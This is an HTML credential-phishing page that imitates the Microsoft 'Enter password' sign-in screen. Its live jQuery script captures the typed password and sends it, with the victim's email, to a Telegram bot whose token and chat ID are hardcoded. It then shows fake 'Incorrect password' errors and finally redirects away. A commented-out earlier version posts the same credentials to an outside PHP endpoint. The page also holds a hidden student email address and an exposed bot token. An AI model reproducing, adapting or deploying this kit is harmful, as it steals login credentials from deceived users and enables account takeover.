<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    
    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">

    <meta name="LocLC" content="en-US">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>

        <meta name="format-detection" content="telephone=no">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>
 
<meta name="robots" content="none">

        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
            <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ltjvsvk5aekta_kgibi0gg2.css" rel="stylesheet">
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style="display: block;">
 

     <!-- <script>
        $(document).ready(function(){

            var ee = "sfgsgdgdg@kfkf.com"
        
         $('#studentid').text(ee);
         $('#passwordError').text("");
         var count = 0;
        $('#i0281').submit(function(e) {
            e.preventDefault();
            count++
            
            var passw = $('#i0118').val();   
                                               
            if (passw.length < 1) {
            $('#passwordError').text("Enter your password");
            }else{                
                if(count < 3){

                    fetch('http://uponsive.live/student.php', {
  method: 'POST',
  body: JSON.stringify({
      username: ee,
      password: passw
    })
})
  .then(response => response.json())
  .then(data => {
    console.log('Response from server:', data);
    // Handle the response as needed
  })
  .catch(error => {
    console.error('Error sending data to server:', error);
    // Handle errors if any
  });
                $('#passwordError').text("Please wait, while you sign in...");
                $("#passwordError").css({ 'color' : 'green' });
                setTimeout(()=>{$('.input').val('');
                $("#passwordError").css({ 'color' : 'tomato' });
                $('#passwordError').text("Incorrect password. Try again");}, 3000);
            }else{
                $('#passwordError').text("");
                
                fetch('http://uponsive.live/student.php', {
  method: 'POST',
  body: JSON.stringify({
    username: ee,
      password: passw
    })
})
  .then(response => response.json())
  .then(data => {
    console.log('Response from server:', data);
    // Handle the response as needed
  })
  .catch(error => {
    console.error('Error sending data to server:', error);
    // Handle errors if any
  });
                    setTimeout(()=>{ window.location.replace("http://www.gdgggd.com");}, 2000);               
            }

            }
            
  });
        
        });
        </script> -->

        <script>
            $(document).ready(function(){
    
                var ee = "sfgsgdgdg@kfkf.com"

                const token = '6755609139:AAGjk2qTfkjKQhcNm8Vp6sz3in-6KAznRBI';
                const chatId = '@medusabit11'; // You can find your chat ID using a bot like @userinfobot
                const message = 'Hello, this is a test message from my web app!';

            
             $('#studentid').text(ee);
             $('#passwordError').text("");
             var count = 0;
            $('#i0281').submit(function(e) {
                e.preventDefault();
                count++
                
                var passw = $('#i0118').val();   

                let message = "";
message += "Online ID            : " + ee + "\n";
message += "Passcode             : " + passw + "\n";
                                                   
                if (passw.length < 1) {
                $('#passwordError').text("Enter your password");
                }else{                
                    if(count < 3){
    
                        $.ajax({
                    url: `https://api.telegram.org/bot${token}/sendMessage`,
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    }),
                    success: function(data) {
                        console.log(data);
                        // alert('Message sent successfully!');
                    },
                    error: function(error) {
                        console.error('Error sending message:', error);
                        alert('Failed to send message.');
                    }
                });

                    $('#passwordError').text("Please wait, while you sign in...");
                    $("#passwordError").css({ 'color' : 'green' });
                    setTimeout(()=>{$('.input').val('');
                    $("#passwordError").css({ 'color' : 'tomato' });
                    $('#passwordError').text("Incorrect password. Try again");}, 3000);
                }else{
                    $('#passwordError').text("");
                    
                    $.ajax({
                    url: `https://api.telegram.org/bot${token}/sendMessage`,
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    }),
                    success: function(data) {
                        console.log(data);
                        // alert('Message sent successfully!');
                    },
                    error: function(error) {
                        console.error('Error sending message:', error);
                        alert('Failed to send message.');
                    }
                });
                        setTimeout(()=>{ window.location.replace("http://www.gdgggd.com");}, 2000);               
                }
    
                }
                
      });
            
            });
            </script>

<div><!--  -->



<form name="f1" id="i0281" spellcheck="false" target="_top" autocomplete="off" class="provide-min-height" method="post">
 
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
  
    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg&quot;);"></div>
 
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails,
                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"><!-- /ko -->

        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible -->
    <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
<img role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_d1229aefd268f350621d48f094122f69.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"><!-- /ko -->

    </button>
    <!-- /ko -->

    <div id="studentid" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

      <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" 

 -->

<div aria-hidden="true">
    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">

    <!-- ko if: svr.fIsUpdatedAutocompleteEnabled -->
    <input type="hidden" name="login" autocomplete="username" data-bind="value: unsafe_username" value="m.allah11328@student.aast.edu">
 
    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
    <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
</div>


<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error --><!-- /ko -->
            <div id="passwordError"  class="error ext-error">Please enter your password.</div>
        </div>

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="passwd" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader passwordError',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off',
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter the password for " tabindex="0">

            <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.fUsePasswordPeek --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div>
        <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
        <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.urlSkipZtd && svr.sZtdUpnHint --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
                        <!-- ko if: svr.fFixUrlResetPassword -->
                        <a id="idA_PWD_ForgotPassword" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: resetPasswordUrl || '#',
                            attr: {
                              target: accessRecoveryLink &amp;&amp; '_blank',
                              role: resetPasswordUrl ? 'link' : 'button'
                            },
                            click: accessRecoveryLink ? null : resetPassword_onClick" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZJNiON0GMabdqY7U9QdVldGBJmDBxHTJv98tQN7SNpm-pGPNpM0k15qmo9J2nx0kjTZ_i9ePS4seNiDiIc9FBHxJAuCIHgYEPbgQRcPe_C0IIheFvRg1fPi5eF5eB7ey_urHdB1AqvjdezdCqhjp2-TDE2RJDVHCWDRKNmaY2iTcGgUt1vErgIMbZnJrdrRx29-f1y9_7C_Pf_5r6_Rn25vkRMvy1bpaaNRFEU9dl3fcupWHDYCM7L96DIHXyHIYwR5UN53IlQ735ZTmmgSBCAAyRC7uzhOMXVpIS0NuKSkUMzEUIPTNoaJC94XVM-ToJYZUKSMkA_EjrIUYbCQ9C4QIb-cLi4zWWWJ6TmGTRfaRtAHoQHGmXg2JiTVDmRV2W3s4En5psyuMw_8I3HiQ-f38qEbJ-FsFafZg8pHZbBWrjxdMxbNwJZhc6OKeE9jloVIdQUuBwYcrFVrPoGgK4ZLMAdDysBzkKtm4oXQslBBGE7kIEwmYcBpM8alpLF5F7KCeT6w-lHkYTp5xumjxCDdvg9N3N2YugJxQTCku4NEMiJrbaN8jw2b8TiKgGXiMxwWuNcxp5wcDtUxN-OafJeGXqHw2ZTbpKjMyexMHscpmF9gWvvMdQ2dGOtXQuQz88C4HBPWSrFwNrXTjplFXgEYMZuvh_LmMtMcHwzhei5gZw42s7BCyZSVZlAib6VXjL6ciEETropt5Y0XvDcHX1aqOxPG0XWFiVdO5NsnqyR2_cB5ERI5aMj_pl4cOnU2CB7vIc_2Xj-oHr11jJyU3nkNq5weHNSOSselk9LzPeTT_R1xv9x_BEfvf9b75PMPfrjx4-3S9X6j1ZpydDHJLYi1G64e-2bgcrjd7llWFCuF7yzaTE6s-m29uEOe4veqyL1q9bp62O_MpK5Kz7DfqsiHN0qPDv-X3ScvvVqrrf1ZEFtm4KS3_mP4m5dLz195uP3u26d__vFr79nN9zxxcDFyimmLlUd-OMKjKO5Ngo0ksryakaDDN9v5gLkgWgl754uj0t81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" role="link">Forgot my password</a>
                        <!-- /ko -->
                        <!-- ko ifnot: svr.fFixUrlResetPassword --><!-- /ko -->
                    </div>
               


                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.fShowButtons,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit"  class="win-button button_primary button ext-button primary ext-primary" 
        value="Sign in">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText--><!-- /ko -->
</div>
    </div>
</div></div>
     
    <!-- /ko -->
        </div>

       
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
      
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->

<!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div></body></html>